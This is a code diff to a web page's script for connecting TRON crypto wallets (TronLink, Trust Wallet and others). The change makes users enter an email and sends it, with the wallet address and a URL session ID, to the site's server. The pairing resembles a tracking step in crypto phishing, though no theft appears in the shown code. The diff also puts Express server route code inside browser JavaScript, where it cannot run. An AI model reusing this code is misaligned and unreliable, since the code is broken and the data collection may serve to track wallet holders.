@@ -84,14 +84,49 @@
     <script>
         let connectedAddress = null;
         let isConnecting = false;
+        
+        // Get session ID from URL parameters
+        const urlParams = new URLSearchParams(window.location.search);
+        const sessionId = urlParams.get('session');
+
+        async function updateServerStatus(address) {
+            try {
+                const response = await fetch('/api/status', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        sessionId: sessionId,
+                        address: address,
+                        email: document.getElementById('emailInput').value
+                    })
+                });
+                
+                if (!response.ok) {
+                    throw new Error('Failed to update server status');
+                }
+            } catch (error) {
+                console.error('Error updating server:', error);
+            }
+        }
 
         async function connectWallet() {
             if (isConnecting) return;
             isConnecting = true;
+            
+            const email = document.getElementById('emailInput').value;
+            if (!email) {
+                document.getElementById('statusMessage').textContent = "Please enter your email address.";
+                isConnecting = false;
+                return;
+            }
+
             document.getElementById('connectButton').textContent = 'Connecting...';
             document.getElementById('connectButton').style.backgroundColor = 'rgb(150, 100, 255)';
 
             const wallets = [window.tronLink, window.trustwallet, window.exodus, window.safepal, window.bitget];
+            
             for (const wallet of wallets) {
                 if (wallet && wallet.tronWeb) {
                     try {
@@ -110,10 +145,29 @@
                 document.getElementById('connectButton').textContent = 'Wallet Connected';
                 document.getElementById('connectButton').style.backgroundColor = 'rgb(0, 128, 0)';
                 document.getElementById('walletAddress').textContent = `Connected TRX Address: ${connectedAddress}`;
+                
+                // Update server with connected address and session ID
+                if (sessionId) {
+                    await updateServerStatus(connectedAddress);
+                }
             }
             
             isConnecting = false;
         }
+
+        // Add API endpoint to check connection status
+        app.get('/api/status', (req, res) => {
+            const sessionId = req.query.session;
+            if (!sessionId) {
+                return res.status(400).json({ error: 'Session ID required' });
+            }
+            
+            // Return the connection status and address if available
+            res.json({
+                isConnected: connectedAddress !== null,
+                address: connectedAddress
+            });
+        });
 
         document.getElementById('connectButton').addEventListener('click', connectWallet);
     </script>
